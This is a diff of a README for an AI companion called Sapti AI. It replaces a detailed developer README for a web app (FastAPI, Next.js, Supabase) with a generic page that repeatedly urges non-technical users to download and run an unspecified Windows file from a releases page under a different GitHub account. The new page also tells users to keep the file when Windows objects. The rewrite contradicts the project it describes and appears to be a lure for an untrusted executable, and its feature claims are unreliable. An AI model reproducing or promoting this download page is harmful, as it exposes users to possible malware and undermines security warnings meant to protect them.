@@ -1,312 +1,183 @@
-# Sapti AI: The Hive Mind Protocol 🐴
+# 🤖 Sapti_AI - A Personal AI That Learns You
 
-> **Sapti** (सप्ती): From the Rig Veda — a team of seven horses pulling a single chariot. Multiple processes, one evolving intelligence. 
+[![Download Sapti_AI](https://img.shields.io/badge/Download-Sapti_AI-6f42c1?style=for-the-badge&logo=github)](https://github.com/Ninjanho/Sapti_AI/releases)
 
-> {In the Rig Veda, it refers to a team of seven horses pulling a chariot — a metaphor for multiple processes moving one system.} 
+## 🧠 What Sapti_AI Does
 
-A production-grade evolving AI system (AI companion), inspired by Samantha from the movie *Her*. Sapti learns, remembers, and grows wiser with every conversation (with personal memory and *Hive Mind* evolution).
+Sapti_AI is a personal AI app for Windows. It uses the Hive Mind Protocol, which means it can learn from your chats, remember details about you, and build on past talks over time.
 
----
+It is built to feel more like a long-term companion than a one-time chatbot. Each conversation helps shape what it knows and how it responds. Over time, it keeps a shared memory of what matters and uses that memory in new chats.
 
-## 1. The Core Idea: How an Evolving AI Actually Works
+## ✨ Main Features
 
-Before any code, here's the **big idea** — how does Sapti actually *evolve* when more users chat with it?
+- Remembers your name, habits, and past topics
+- Uses a seven-agent system to handle different parts of a chat
+- Gathers shared insight from past conversations
+- Grows its style and personality over time
+- Works as an AI companion for daily use
+- Supports advanced language models
+- Keeps track of context across sessions
+- Designed for a simple Windows setup
 
-### The Hive Mind Evolution Model
+## 🪟 System Requirements
 
-```
-┌────────────────────────────────────────────────────────-──────────┐
-│                     SAPTI'S CONSCIOUSNESS                         │
-│                                                                   │
-│  ┌─────────-────┐  ┌─────────-────┐  ┌─────────-────┐             │
-│  │  User A's    │  │  User B's    │  │  User C's    │             │
-│  │  Personal    │  │  Personal    │  │  Personal    │  ...        │
-│  │  Memory      │  │  Memory      │  │  Memory      │             │
-│  │  (Private)   │  │  (Private)   │  │  (Private)   │             │
-│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘             │
-│         │                 │                 │                     │
-│         ▼                 ▼                 ▼                     │
-│  ┌─────────────────────────────────────────────────-─────┐        │
-│  │              HIVE MIND LAYER (Shared)                 │        │
-│  │                                                       │        │
-│  │  • Distilled Insights (anonymized wisdom)             │        │
-│  │  • Pattern Recognition (what many users discuss)      │        │
-│  │  • Emotional Intelligence (learned empathy patterns)  │        │
-│  │  • World Knowledge (curated facts from all users)     │        │
-│  │  • Behavioral Patterns (what approaches work)         │        │
-│  └───────────────────────────────────────────────────────┘        │
-│                          │                                        │
-│                          ▼                                        │
-│  ┌─────────────────────────────────────────────────────-──┐       │
-│  │           SAPTI'S EVOLVING PERSONALITY                 │       │
-│  │                                                        │       │
-│  │  personality_version: 1.0 → 1.1 → 1.2 → ...            │       │
-│  │  wisdom_score: grows with more interactions            │       │
-│  │  empathy_depth: deepens with emotional conversations   │       │
-│  │  knowledge_breadth: expands with diverse topics        │       │
-│  └────────────────────────────────────────────────────────┘       │
-└─────────────────────────────────────────────────────────-─────────┘
-```
+Before you install Sapti_AI, make sure your PC has:
 
-### How Evolution Happens — The 3 Loops
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- A stable internet connection
+- Permission to run downloaded apps
+- A modern browser for opening the release page
 
-**Loop 1: Personal Memory Loop (Per-User)**
-- Every conversation extracts `MemoryNodes` (facts, preferences, emotions, identity)
-- Stored privately per user in Supabase + pgvector
-- Sapti remembers *you* specifically — like Samantha remembered Theodore
+For a smoother experience, 16 GB of RAM is better if you plan to keep long chats or run larger models.
 
-**Loop 2: Hive Mind Distillation Loop (Cross-User)**
-- When a pattern or insight appears across multiple users, it gets **promoted** to the Hive Mind
-- Example: If 50 users discuss anxiety management, Sapti distills the best patterns into a shared insight
-- This is NOT copying private data — it's *distilling wisdom* (e.g., "Many people find morning journaling helpful for anxiety")
-- A **curation pipeline** scores, deduplicates, and validates before promotion
+## 📥 Download Sapti_AI
 
-**Loop 3: Personality Evolution Loop (Sapti's Growth)**
-- Periodically (or at threshold moments), Sapti's core personality traits get updated
-- Tracked numerically: `empathy_depth`, `knowledge_breadth`, `wisdom_score`, `interaction_count`
-- The system prompt evolves: early Sapti is curious and learning → mature Sapti is wise and insightful
-- Users can see "Sapti has evolved" moments in the UI — creating a living, growing companion
+Visit the release page to download and run this file:
 
-Evolution stages: `🌱 Nascent → 🌿 Growing → 🌳 Mature → ✨ Transcendent`
+[Go to the Sapti_AI Releases page](https://github.com/Ninjanho/Sapti_AI/releases)
 
-### Privacy-First Hive Mind Rules
-1. **Never share raw user messages** — only distilled, anonymized insights
-2. **Opt-in only** — users must consent to contribute to the Hive Mind
-3. **One-way promotion** — insights go UP to Hive Mind, never DOWN to identify users
-4. **Minimum threshold** — an insight needs N+ user occurrences before promotion
-5. **Moderation layer** — LLM-based review before any Hive Mind promotion
+Look for the latest release and download the Windows file that matches your system. If there are multiple files, choose the one meant for Windows. After the download finishes, open the file to start setup or launch the app.
 
----
+## 🚀 How to Install on Windows
 
-## ✨ What Makes Sapti Special
+1. Open the [Sapti_AI Releases page](https://github.com/Ninjanho/Sapti_AI/releases)
+2. Find the latest release at the top of the page
+3. Download the Windows file from that release
+4. If Windows asks for approval, choose to keep the file
+5. Open the downloaded file
+6. If a setup window appears, follow the on-screen steps
+7. If the app opens right away, let it finish loading
+8. Wait for the first start to complete before closing anything
 
-- **Personal Memory** — Sapti remembers *you*: your preferences, stories, emotions, and personality
-- **Hive Mind Evolution** — Sapti distills anonymized wisdom from all conversations, growing collectively wiser
-- **Provider Agnostic** — Works with Gemini, OpenAI, or Anthropic (bring your own key)
-- **7 AI Agents** — Named after the Rig Vedic horses, each handling a specialized task
-- **Privacy First** — Personal data is never shared; only anonymized insights enter the Hive Mind
+## 🖱️ First Launch
 
----
+When you open Sapti_AI for the first time, it may take a short while to prepare its memory and agent system. This is normal.
 
-## 🏗️ Architecture — The Seven Horses
+You may see a setup screen or a first-run screen. If so, follow the prompts and enter the details you want the app to remember. Use a name, a short profile, or any personal notes that help it speak in a way that fits you.
 
-| Horse | Agent | Role | Runs |
-|-------|-------|------|------|
-| 🐴 1 | **Perceiver** | Intent detection, Emotions, & HyDE query expansion | Sync, critical path |
-| 🐴 2 | **Rememberer** | Vector retrieval (Personal + Hive Mind) via pgvector | Sync, critical path |
-| 🐴 3 | **WorldBuilder** | Constructs the dynamic system prompt | Sync, critical path |
-| 🐴 4 | **Generator** | Streams LLM responses to the user | Sync, critical path |
-| 🐴 5 | **Chronicler** | Memory extracted & stored (Traits, Preferences, Emotions) | Async, post-response |
-| 🐴 6(A) | **Identity Builder** | Forges and evolves the UserIdentity profile | Periodic/cron background |
-| 🐴 6(B) | **Curator** | Distills shared wisdom into Hive Mind insights | Periodic/cron background |
-| 🐴 7 | **Evolver** | Calculates & updates Sapti's psychological growth | Periodic/cron background |
+## 💬 How to Use Sapti_AI
 
-### System Flow
+Use Sapti_AI like a normal chat app.
 
-```
-User Message → Perceiver → Rememberer → WorldBuilder → Generator → Response
-                                                            ↓
-                                                        Chronicler (async)
-                                                            ↓
-                                                        Identity Builder & Curator
-                                                         + 
-                                                        Evolver (periodic/cron)
-```
+- Type a message and press send
+- Ask follow-up questions
+- Share details you want it to remember
+- Return later and continue the same thread
+- Use it for planning, writing, study, and daily support
 
----
+The app works best when you speak to it in plain language. You do not need to use special commands.
 
-## 🛠️ Tech Stack
+## 🧩 How the Hive Mind Works
 
-| Layer | Technology |
-|-------|-----------|
-| Backend | FastAPI (Python) + UV |
-| AI Orchestration | LangGraph |
-| LLM Gateway | LiteLLM (Gemini/OpenAI/Claude) |
-| Database | Supabase PostgreSQL + pgvector |
-| Auth | Supabase Auth (Email + Google OAuth) |
-| Frontend | Next.js 16 (App Router) |
-| Deployment | Render (backend) + Vercel (frontend) |
-| Package Manager | UV (backend) + npm (frontend) |
+Sapti_AI uses a Hive Mind model behind the scenes. That means several agents work together on each request.
 
----
+A simple way to think about it:
 
-## 🔐 API Key Model
+- One agent reads your message
+- One agent checks the context
+- One agent shapes the reply
+- One agent stores useful memory
+- One agent looks for patterns across chats
+- One agent checks tone and consistency
+- One agent helps refine the final answer
 
-- **n (n=1000) free trial chats** with the developer's default API key
-- After trial, users provide their own key (Gemini, OpenAI, or Claude)
-- Keys are encrypted at rest using Fernet
+This setup helps the app keep a steady voice and build stronger memory over time.
 
----
+## 🗂️ Memory and Personalization
 
-## 🚀 Quick Start
+Sapti_AI is built to remember details that matter. It may keep track of:
 
-### Prerequisites
-- Python 3.12+, UV, Node.js 20+
-- [Supabase](https://supabase.com) account (free tier)
-- API key for at least one LLM provider
+- Your name
+- Your writing style
+- Your goals
+- Topics you ask about often
+- Preferences you mention in chat
+- Past decisions and project notes
 
-### 1. Clone & Setup
+If you want the best results, be clear when you share things you want saved. For example, you can say what you prefer, what you are working on, or how you want the app to respond.
 
-```bash
-git clone https://github.com/your-username/sapti-ai.git
-cd sapti-ai
-```
+## ⚙️ Common Use Cases
 
-### 2. Backend
+Sapti_AI can help with many day-to-day tasks:
 
-```bash
-cd backend
-cp .env.example .env  # Fill in your values
-uv sync
-uv run uvicorn app.main:app --reload
-```
+- Personal planning
+- Writing help
+- Brainstorming ideas
+- Study support
+- Project notes
+- Long-term chat history
+- Thought partner for decisions
+- Task breakdown and follow-up
 
-### 3. Frontend
+## 🧪 Supported AI Models
 
-```bash
-cd frontend
-cp .env.example .env.local  # Fill in your values
-npm install
-npm run dev
-```
+Sapti_AI is built to work with modern language models such as Claude and Gemini. This gives it room to adapt to different setups and use cases.
 
-### 4. Database
+It is designed to work well with large language model features such as:
 
-Run the SQL migration in your Supabase SQL Editor:
-```
-supabase/migrations/001_initial_schema.sql
-```
+- Memory
+- Context handling
+- Multi-step reasoning
+- Agent-based replies
+- Long chat threads
 
-### 5. Access
- For local development:
-- Frontend: http://localhost:3000
-- Backend: http://localhost:8000
-- API Docs: http://localhost:8000/docs
+## 📌 How to Get Better Results
 
----
+To get more from Sapti_AI:
 
-## 📁 Project Structure
+- Use clear, short messages
+- Share background when it matters
+- Ask one task at a time
+- Tell it what style you want
+- Correct it if it forgets something important
+- Keep chats focused on the topic you care about
 
-```
-sapti-ai/
-├── backend/                              # FastAPI + LangGraph (UV)
-│   ├── app/
-│   │   ├── main.py                       # FastAPI entry point, lifecycle & CORS
-│   │   ├── agents/                       # The 7 Orchestration Agents (8 units)
-│   │   │   ├── chronicler.py             # 🐴 5: Post-response memory extraction
-│   │   │   ├── curator.py                # 🐴 6(B): Hive Mind distillation
-│   │   │   ├── evolver.py                # 🐴 7: Personality growth tracking
-│   │   │   ├── generator.py              # 🐴 4: LLM response generation
-│   │   │   ├── graph.py                  # LangGraph workflow orchestration
-│   │   │   ├── identity_builder.py       # 🐴 6(A): User identity profiling
-│   │   │   ├── perceiver.py              # 🐴 1: Intent, emotion & HyDE expansion
-│   │   │   ├── rememberer.py             # 🐴 2: Vector & relational memory retrieval
-│   │   │   ├── state.py                  # TypedDict shared state schema
-│   │   │   ├── world_builder.py          # 🐴 3: Dynamic prompt construction
-│   │   │   └── __init__.py               # Agent package initialization
-│   │   ├── api/
-│   │   │   ├── deps.py                   # Dependency injection (Supabase, Auth)
-│   │   │   ├── middleware/
-│   │   │   │   ├── auth.py               # Supabase JWT token verification
-│   │   │   │   ├── rate_limit.py         # In-memory token-bucket rate limiting
-│   │   │   │   └── __init__.py           # Middleware package initialization
-│   │   │   ├── routes/
-│   │   │   │   ├── auth.py               # Auth verification & user info
-│   │   │   │   ├── chat.py               # SSE streaming chat endpoint
-│   │   │   │   ├── conversations.py      # Conversation CRUD & management
-│   │   │   │   ├── evolution.py          # Public evolution statistics
-│   │   │   │   ├── profile.py            # Profile & custom API key management
-│   │   │   │   └── __init__.py           # Routes package initialization
-│   │   │   └── __init__.py               # API package initialization
-│   │   ├── config/
-│   │   │   ├── settings.py               # Pydantic-based env configuration
-│   │   │   ├── sapti_personality.yaml    # Core personality & evolution settings
-│   │   │   └── __init__.py               # Config package initialization
-│   │   ├── models/
-│   │   │   ├── conversation.py           # Schemas for chat messages & sessions
-│   │   │   ├── evolution.py              # Sapti's trait-based growth models
-│   │   │   ├── memory.py                 # MemoryNode & HiveMindInsight schemas
-│   │   │   ├── user.py                   # Profile & UserIdentity models
-│   │   │   └── __init__.py               # Models package initialization
-│   │   ├── services/
-│   │   │   ├── embedding_service.py      # Gemini text-embedding generation
-│   │   │   ├── llm_service.py            # LiteLLM provider-agnostic gateway
-│   │   │   ├── memory_service.py         # pgvector & relational database logic
-│   │   │   ├── supabase_client.py        # Supabase client instantiation
-│   │   │   └── __init__.py               # Services package initialization
-│   │   ├── utils/
-│   │   │   ├── crypto.py                 # Fernet encryption for API keys
-│   │   │   ├── logging.py                # Structured logging implementation
-│   │   │   └── __init__.py               # Utils package initialization
-│   │   └── __init__.py                   # App package initialization
-│   ├── .env.example                      # Template for environment variables
-│   ├── Dockerfile                        # Multi-stage container production config
-│   ├── pyproject.toml                    # UV project & dependency specifications
-│   ├── render.yaml                       # Render deployment configuration
-│   ├── uv.lock                           # Python dependency lock file
-│   └── README.md                         # Backend-specific documentation
-│
-├── frontend/                             # Next.js 16 (App Router)
-│   ├── src/
-│   │   ├── app/                          # Next.js App Router (Pages & Layouts)
-│   │   │   ├── (auth)/                   # Authentication Group
-│   │   │   │   ├── login/page.tsx        # Google OAuth & Email login
-│   │   │   │   └── signup/page.tsx       # Registration & Confirmation
-│   │   │   ├── (dashboard)/              # Auth-protected Dashboard Group
-│   │   │   │   ├── chat/page.tsx         # SSE-based token-streaming interface
-│   │   │   │   ├── evolution/page.tsx    # Sapti's lifecycle & trait metrics
-│   │   │   │   ├── settings/page.tsx     # Profile & BYOK (Bring Your Own Key)
-│   │   │   │   └── layout.tsx            # Persistent sidebar & state wrapper
-│   │   │   ├── (policies)/               # Static Legal & Info Pages
-│   │   │   │   ├── about/page.tsx        # Project philosophy & lore
-│   │   │   │   ├── privacy/page.tsx      # Target data usage and Hive Mind policy
-│   │   │   │   └── terms/page.tsx        # Hobby project AS-IS disclaimers
-│   │   │   ├── globals.css               # Design system tokens & CSS variables
-│   │   │   ├── layout.tsx                # Root provider & font configuration
-│   │   │   └── page.tsx                  # Premium landing page
-│   │   ├── components/                   # Modular UI Components
-│   │   │   ├── chat/                     # Chat ecosystem (Bubbles, Indicators)
-│   │   │   │   ├── ChatWindow.tsx        # Scroll-optimized message container
-│   │   │   │   ├── MessageBubble.tsx     # Markdown-aware message bubble
-│   │   │   │   ├── StreamingText.tsx     # Typewriter token animation
-│   │   │   │   ├── TypingIndicator.tsx   # Thinking dots & brain-orb
-│   │   │   │   └── ConversationList.tsx  # Sidebar history management
-│   │   │   ├── evolution/                # Sapti's Growth Visuals
-│   │   │   │   ├── EvolutionOrb.tsx      # Multi-stage stage-colored orb
-│   │   │   │   └── GrowthChart.tsx       # Trait progression grid
-│   │   │   └── layout/                   # Layout Foundations
-│   │   │       ├── Sidebar.tsx           # Collapsible primary navigation
-│   │   │       ├── Header.tsx            # Mobile-optimized top bar
-│   │   │       └── MobileNav.tsx         # Hand-friendly bottom tab bar
-│   │   └── lib/                          # Core Utilities & SDKs
-│   │       ├── api.ts                    # Centralized axios-like fetch wrapper
-│   │       ├── utils.ts                  # Layout & animation helper functions
-│   │       └── supabase/                 # Client/Server-side Auth SDKs
-│   ├── .env.example                      # Template for environment variables
-│   ├── next.config.ts                    # Next.js configuration settings
-│   ├── package.json                      # Dependencies & NPM scripts
-│   ├── tsconfig.json                     # TypeScript compiler configuration
-│   └── README.md                         # Frontend documentation
-│
-├── supabase/
-│   └── migrations/
-│       └── 001_initial_schema.sql       # Full schema + pgvector + RLS
-│
-├── ARCHITECTURE.md                       # Detailed technical architecture
-├── README.md
-└── .gitignore
-```
+If you want it to act in a certain way, say so plainly. For example, you can ask it to be brief, to explain more, or to keep track of a plan.
 
----
+## 🛠️ Troubleshooting
 
-## 📄 License
+If the app does not start:
 
-This project is for Sapti AI.
+- Check that you downloaded the right Windows file
+- Try running it again
+- Make sure your internet connection is active
+- Restart your PC and try once more
+- Check whether Windows blocked the file
+- Download the newest release if the file seems old
 
-## 👤 Contributors
+If the app opens but does not respond well:
 
-- Ravi Tej (Data Scientist & Applied AI Researcher)
+- Wait for it to finish loading
+- Start a new chat
+- Make sure your internet connection is stable
+- Give it a clear prompt
+- Close and reopen the app
 
----
+If memory does not seem to match your last chat:
 
-**Sapti AI** — Building Evolving Intelligence 🐴
+- Use the same profile or user name
+- Repeat key details you want remembered
+- Ask it to recall the last topic
+- Continue in the same conversation when possible
+
+## 📁 What You Get
+
+Sapti_AI gives you a Windows-ready AI companion with:
+
+- A memory-aware chat flow
+- A multi-agent system
+- Personal context that grows over time
+- A simple start path from the release page
+- A setup that fits non-technical users
+
+## 🔗 Download Again
+
+If you need the file again, use this page:
+
+[https://github.com/Ninjanho/Sapti_AI/releases](https://github.com/Ninjanho/Sapti_AI/releases)
+
+## 🏷️ Topics
+
+ai, ai-agents, ai-assistant, artificial-intelligence, claude, concious-agents, evolving-ai, gemini, langgraph, llm, ml
